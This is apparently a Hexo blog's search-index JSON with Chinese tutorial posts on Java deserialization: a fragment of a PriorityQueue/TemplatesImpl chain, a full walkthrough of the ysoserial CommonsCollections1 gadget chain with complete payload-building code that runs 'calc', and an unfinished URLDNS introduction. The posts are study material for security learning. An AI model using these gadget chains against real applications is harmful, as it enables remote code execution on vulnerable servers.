_bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.offer(templates); priorityQueue.offer(templates); Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass(); Field transformer = aClass.getDeclaredField(&quot;transformer&quot;); transformer.setAccessible(true); transformer.set(transformingComparator,newTransformer); //Serialize(priorityQueue); unSerialize(&quot;priorityQueue.txt&quot;) &#125;&#125; 反序列化：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(一)","slug":"20211228","date":"2021-12-28T07:34:26.000Z","updated":"2022-01-10T07:44:49.375Z","comments":false,"path":"2021/12/28/20211228/","link":"","permalink":"https://self209.github.io/2021/12/28/20211228/","excerpt":"本文通过分析ysoserial工具中的CommonsCollections1 Gadget chain，复现漏洞，来学习Commons Collections反序列化漏洞。","text":"本文通过分析ysoserial工具中的CommonsCollections1 Gadget chain，复现漏洞，来学习Commons Collections反序列化漏洞。 漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 执行类InvokerTransformer.transform()InvokerTransformer.transform() 12345678910111213141516171819202122232425262728293031323334353637public class InvokerTransformer implements Transformer, Serializable &#123; /** The method name to call */ private final String iMethodName; /** The array of reflection parameter types */ private final Class[] iParamTypes; /** The array of reflection arguments */ private final Object[] iArgs; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125; &#125; &#125; 直接来看关键代码，这里使用反射调用方法，并且传递的参数都可控。transform接收一个对象input，获取input对象的Class对象赋值到cls，获取cls对象的方法，通过invoke调用，iMethodName，iParamTypes，iArgs都可以通过构造函数传递。 123Class cls = input.getClass();Method method = cls.getMethod(iMethodName, iParamTypes);return method.invoke(input, iArgs); 既然都是可控的，那我们就利用InvokerTransformer.transform()来执行命令调用计算器试试。 1234567//首先获取一个Runtime对象Runtime R = Runtime.getRuntime();//尝试使用InvokerTransformer.transform()来执行命令调用计算器//1、new一个InvokerTransformer对象将Runtime的exec方法,参数类型，通过构造函数传递进去。InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);//2、调用transform方法，将Runtime对象R传递进去。invokerTransformer.transform(R); 运行代码： Gadget chain现在执行类已经有了，接下来就要找调用链了，从ysoserial工具的Gadget chain来看，它找了两个与执行类危险方法不同类相同名的方法作为ConstantTransformer.transform()，ChainedTransformer.transform() ConstantTransformer.transform()12345678910111213141516171819202122232425262728public class ConstantTransformer implements Transformer, Serializable &#123; /** The closures to call in turn */ private final Object iConstant; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125;&#125; ConstantTransformer.transform()方法是接收一个对象input，返回一个对象iConstant，iConstant可以通过构造函数控制。 ChainedTransformer.transform()1234567891011121314151617181920212223242526272829303132public class ChainedTransformer implements Transformer, Serializable &#123; /** The transformers to call in turn */ private final Transformer[] iTransformers; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param transformers the transformers to chain, not copied, no nulls */ public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125; /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125; ChainedTransformer.transform()方法是接收一个对象，然后遍历调用iTransformers数组内，对象的transform方法，并且将返回值传递给下一个调用transform方法的对象。 刚开始接触这两个方法，从功能上来看一个返回固定对象(这个对象可控)，一个类似于链式调用，并不清楚这两个方法在Gadget chain起什么作用，没关系我们先按照上一篇文章所讲的寻找Gadget chain的方法来寻找与执行类相连的类。 在LazyMap类下的get方法调用了factory.transform(key)。 LazyMap.get()123456789101112131415161718192021222324public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = factory; &#125; public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key); &#125; &#125; get方法接收一个对象key，然后判断是否包含指定的键，false的话就会调用factory.transform(key)。看看factory是否可控，发现可以通过构造函数传递，但是并不能直接new，需要通过静态方法decorate()，factory的类型是Transformer，InvokerTransformer实现了Transformer接口，所以可以将InvokerTransformer对象传递给factory，那么当我们调用get方法并且传递一个Runtime对象时不就又实现invokerTransformer.transform(R);了。上代码 12345678910//首先获取一个Runtime对象Runtime R = Runtime.getRuntime();//尝试使用InvokerTransformer.transform()来执行命令调用计算器//1、new一个InvokerTransformer对象将Runtime的exec方法,参数类型，通过构造函数传递进去。类型改为Transformer，decorate要什么参数类型我们最好就传什么类型。Transformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);//2、decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//3、调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,invokerTransformer);r.get(R); 运行代码： 接下来就是找什么地方调用了get方法，ysoserial Gadget chain中是在AnnotationInvocationHandler类下的invoke方法中调用了get，AnnotationInvocationHandler是动态代理类，invoke方法是当proxy代理对象调用方法时自动调用的。这里需要对动态代理有一定的理解 AnnotationInvocationHandler.invoke()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues; &#125; public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result; &#125; private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125; &#125; &#125; 在AnnotationInvocationHandler类下的invoke方法中调用了memberValues.get()方法，memberValues是构造方法传递的一个Map对象是可控的，而调用decorate静态方法构造的LazyMap对象，它刚好返回Map类型。 那我们现在就要考虑如何调用到memberValues.get(member)方法，首先他会获取proxy代理对象调用方法的方法名,如果调用equals就会进入第一个if，并且当你调用有参方法时就会进入第二个if报错，也就是说我们的proxy代理对象需要调用一个无参方法，才会调用到memberValues.get(member);，无参方法这个应该可以找到，那我们再看看member，他是一个String类型，是获取proxy代理对象调用方法的方法名，而根据前面的链LazyMap.get(Runtime对象)，我们需要接收的是一个Runtime对象,这就陷入了僵局。 山穷水尽疑无路，柳暗花明又一村我们来回顾一下调用链需要满足的条件： 调用链所以类都要实现Serializable 调用链的传递类型要相同 现在有两个问题： Runtime类不能序列化。 memberValues.get(member)，member类型不一致。 遇到问题不要慌，把问题列出来一个一个想办法解决。 这就是为什么前面会出现ChainedTransformer.transform()，ConstantTransformer.transform()这两个类的原因，这两个类的transform方法完美解决了上面的两个问题，可以说是全场最佳。下面就来看看这两个类是如何解决上面这两个问题的。 我们先来解决Runtime类不能序列化。 将Runtime类转为可序列化形式Runtime类 123456789101112public class Runtime &#123; public static Runtime getRuntime() &#123; return currentRuntime; &#125; private Runtime() &#123;&#125; public Process exec(String command) throws IOException &#123; return exec(command, null, null); &#125; &#125; Runtime类没有实现Serializable接口，无法序列化，InvokerTransformer类实现了Serializable接口，所以我们就可以运用反射机制，调用exec方法再将其转换为InvokerTransformer的形式，这里要注意，Runtime类的构造方法需要通过静态方法getRuntime调用，所以我们需要先获取Runtime类getRuntime方法，再invoke调用getRuntime获取Runtime对象，再获取Runtime类的exec方法，最后调用exec方法。 12345678910//获取Runtime类的Class 对象Class C = Runtime.class;//获取getRuntime方法Method getRuntimeMethod = C.getMethod(&quot;getRuntime&quot;,null);//invoke调用getRuntimeMethod方法，获取Runtime对象。getRuntime是无参静态方法，所以传递两个null就行，返回值是一个Object类型，我们把他强转为getRuntimeRuntime r = (Runtime) getRuntimeMethod.invoke(null,null);//获取Runtime类的exec方法Method execMethod = C.getMethod(&quot;exec&quot;,String.class);//调用exec方法execMethod.invoke(r,&quot;calc&quot;); 运行代码： 将其转换为InvokerTransformer的形式， 1234Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 代码执行： InvokerTransformer形式的Runtime调用不就跟链式调用一样，先传一个Runtime.class到InvokerTransformer的transform方法中，返回一个Method getRuntimeMethod对象，再把Method getRuntimeMethod对象传到下一个InvokerTransformer的transform方法中，返回一个Runtime r对象，再把Runtime r对象传到下一个InvokerTransformer的transform方法中，实现计算器调用。这是不是和前面提到的ChainedTransformer.transform()方法，遍历调用iTransformers数组内，对象的transform方法，并且将返回值传递给下一个调用transform方法的对象，完美契合。 运用ChainedTransformer.transform()方法实现Runtime.getRuntime().exec()1234567Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; new ChainedTransformer(transformers).transform(Runtime.class); 代码执行： 解决member类型不一致现在，Runtime类不能序列化的问题解决了，再来看看member类型不一致问题，想象一下，当LazyMap通过构造函数赋值给memberValues，那么memberValues.get(member)调用的就是LazyMap.get(key)，member就传递到了key，调用LazyMap.get(key)，因为通过LazyMap.decorate(map,invokerTransformer)将invokerTransformer赋值给了factory，factory.transform(key)就相当于调用ChainedTransformer.transform()，key就传递到了object，但是member是String类型，而ChainedTransformer.transform需要接收一个Runtime.class才能执行代码。前面提到ConstantTransformer.transform()方法是接收一个对象input，不管接收的input是什么对象，都返回一个iConstant对象，iConstant可以通过构造函数控制。那我们是不是可以合理运用一下把Runtime.class通过ConstantTransformer的构造函数传递给iConstant，这样当String类型传递到ChainedTransformer.transform方法后，调用ConstantTransformer.transform()把iConstant返回给下一个InvokerTransformer的transform方法，形成了一个替换。 ConstantTransformer.transform() 12345678910111213141516171819202122232425262728public class ConstantTransformer implements Transformer, Serializable &#123; /** The closures to call in turn */ private final Object iConstant; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125;&#125; 直接上代码 12345678910111213141516//new 一个Transformer[]数组，将InvokerTransformer对象传递进去，形成链式调用。ConstantTransformer对象负责把String类型换成Runtime.classTransformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;;//new 一个ChainedTransformer对象Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);//定义一个String类型的变量，模拟一下String member = &quot;member&quot;;r.get(member); 运行代码： Map(Proxy).entrySet()遇到的问题都解决了，那我们接着找调用链，invoke方法是当proxy代理对象调用任意方法时自动调用的，并且得是无参方法才能调用memberValues.get(member)，那我们就得先获取InvocationHandler对象，再创建proxy代理对象，AnnotationInvocationHandler是私有类，所以需要通过反射获取AnnotationInvocationHandler Class对象，再获取构造方法，再构造InvocationHandler对象。 1234567891011 //获取AnnotationInvocationHandler Class对象Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//获取构造方法Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);//设置访问权限AnnotationInvocationHandlerConstructor.setAccessible(true);//InvocationHandler 对象InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r);//创建代理对象Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); proxyMap对象调用任意方法的时候，就会去调用invocationHandler对象的invoke方法，那么我们就要想办法找一个可以传递Map类型对象的类，并且还得有无参方法。 入口类AnnotationInvocationHandler.readObject()AnnotationInvocationHandler类重写了readObject方法，并且readObject方法调用了memberValues.entrySet()无参方法，memberValues是Map类型，可以通过构造方法控制，那我们是不是可以将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo，当反序列化ooo对象时，调用readObject()，memberValues是proxyMap对象，当代码执行到memberValues.entrySet()时，就是调用proxyMap.entrySet()，就会触发invocationHandler对象invoke方法，invocationHandler对象的memberValues等于r ，当调用到memberValues.get(member)时，就是调用r.get(member)这样就把整条链连接起来了。 最后完整的调用链代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.*;import java.net.URL;import java.util.HashMap;import java.util.Map;public class cc1Serialize &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ooo.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException &#123; //new 一个Transformer[]数组，将InvokerTransformer对象传递进去，形成链式调用。 Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); //获取AnnotationInvocationHandler Class对象 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //获取构造方法 Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); //设置访问权限 AnnotationInvocationHandlerConstructor.setAccessible(true); //InvocationHandler 对象 InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r); //创建代理对象 Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); //将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo InvocationHandler ooo = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,proxyMap); &#125;&#125; 序列化ooo对象： 反序列化ooo对象：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化URLDNS","slug":"20211226","date":"2021-12-26T01:34:26.000Z","updated":"2022-01-09T05:55:19.508Z","comments":false,"path":"2021/12/26/20211226/","link":"","permalink":"https://self209.github.io/2021/12/26/20211226/","excerpt":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。","text":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。 java原生反序列化JDK类库中的序列化API java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。 对象序列化包括如下步骤： 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流； 通过对象输出流的writeObject()方法写对象。 对象反序列化的步骤如下： 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流； 通过对象输入流的readObject()方法读取对象。 例： 定义一个Student类，实现Serializable接口 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.Serializable;public class Student implements Serializable &#123; private int age; private String name; private String sex; public Student()&#123; &#125; public Student(String name,int age,String sex)&#123; this.age = age; this.name = name; this.sex = sex; &#125; public int getAge() &#123; return age; &#125; public String getName() &#123; return name; &#125; public String getSex() &#123; return sex; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125;&#125; 序列化和反序列化Student类对象 123456789101112131415161718192021222324252627282930313233343536373839import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.text.MessageFormat;public class SerializeAndDeserialize &#123; public static void main(String[] args) throws Exception &#123; SerializeStudent();//序列化Student对象 Student s = DeserializeStudent();//反序列Student对象 System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;, s.getName(), s.getAge(), s.getSex())); &#125; private static void SerializeStudent() throws FileNotFoundException,IOException &#123; Student student = new Student(&quot;zhangsan&quot;,18,&quot;男&quot;); // ObjectOutputStream 对象输出流，将Student对象存储为Student.txt文件中，完成对Student对象的序列化操作 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;Student.txt&quot;))); oo.writeObject(student); System.out.println(&quot;Student对象序列化成功！&quot;); oo.close(); &#125; private static Student DeserializeStudent() throws Exception, IOException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream( new File(&quot;Student.txt&quot;))); Student student = (Student) ois.readObject(); System.out.println(&quot;Student对象反序列化成功！&quot;); return student; &#125;&#125; 代码运行结果如下： 反序列化漏洞形成的必要条件漏洞的形成需要找到如下三个条件相关的类，并且都得实现了Serializable接口。 执行类(风险方法类) sink 调用链 gadget chain 入口类 source 1、执行类 存在风险方法，并且传递参数可控 比如： 反射调用参数可控(RCE、SSRF) Runtime类的相关方法(RCE) URL类的相关方法(SSRF) …… 2、调用链 调用链就是将执行类的风险方法与入口类的readObject方法中调用的方法关联或者说联系在一起的一个或多个类的方法，与执行类的风险方法相连接的链，必须是同类型或者说类型宽泛，方法名相同与否都可以，但是方法内必须调用与执行类的风险方法同名，以此类推直至找到与入口类的readObject方法中调用的方法同名的方法，调用链才算完成。 这个解释看不懂没关系，后面在如何寻找gadget chain中会作详细解释。 3、入口类 入口类首先得重写readObject方法，类型越宽泛越好 。例如：HashMap 如何寻找gadget chain这里结合流程图对寻找gadget chain作详细解释，以第一个链为例，后面的链都是一个道理。 假设这里有一个命令执行风险类A,其中的a方法存在命令执行风险(这里不探究具体代码,只是理解调用链的链接方式) 现在我们要找它的第一个链，现在有三个选择 同类不同名方法调用了a() 不同类同名方法调用了a() 不同类不同名方法调用了a() 当我们选择同类不同名方法调用了a()时，需要考虑的是参数ghi是否可控。 当我们选择不同类同名方法调用了a()时，需要考虑的是Abc与Ghi是否是同类型，x2可否控制或者说可不可以通过其他方式控制。 当我们选择不同类不同名方法调用了a()，需要考虑的是Def与Ghi是否是同类型，x1可否控制或者说可不可以通过其他方式控制。 往后的链都是一个道理，直至找到与入口类的readObject方法中，调用的方法同名的方法。 比如：HashMap.readObject()中调用了hash()，那么我们的链找到hash()方法就可以，当然具体能不能用还是要看参数是否可控。 URLDNS Gadget Chain12345ysoserial Gadget Chain: HashMap.readObject()//入口类 HashMap.putVal() HashMap.hash() URL.hashCode() //执行类 从ysoserial工具的payload来看，执行类是URL的hashCode方法，那我们就跟进去URL类去看看。 URL类 123456789 private int hashCode = -1; public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode默认等于-1，那么就会调用handler.hashCode(this); 跟进到handler.hashCode(); 调用handler.hashCode();传入一个URL对象，会调用getHostAddress方法，根据注释Get the IP address of our host.获取主机ip地址，会向host发送请求。 123456789101112131415161718192021222324252627/** * Get the IP address of our host. An empty host field or a DNS failure * will result in a null return. * * @param u a URL object * @return an &#123;@code InetAddress&#125; representing the host * IP address. * @since 1.3 */ protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress; &#125; 好的，现在执行类已经有了，URL.hashCode()。下面开始找调用链，直接搜索hashCode。 嗯。漂亮，1291处这里就不一个一个看了，我们就直接来看payload的Gadget Chain。HashMap.hash() 这里不就是上面所说的，不同类不同名方法调用了hashCode()，我们只需要看是否是同类型，参数是否可控。这里一个类型Object，一个URL，万物皆Object，符合。但是key并不清楚能否控制，接着往下找。 接下来找那些类调用了hash()，不多，有24处，可以稍微看一下。 直接找到了入口类 HashMap.readObject()， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Reconstitutes this map from a stream (that is, deserializes it). * @param s the stream * @throws ClassNotFoundException if the class of a serialized object * could not be found * @throws IOException if an I/O error occurs */private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it&#x27;s the nearest public type to // what we&#x27;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false);//调用hash(key) &#125; 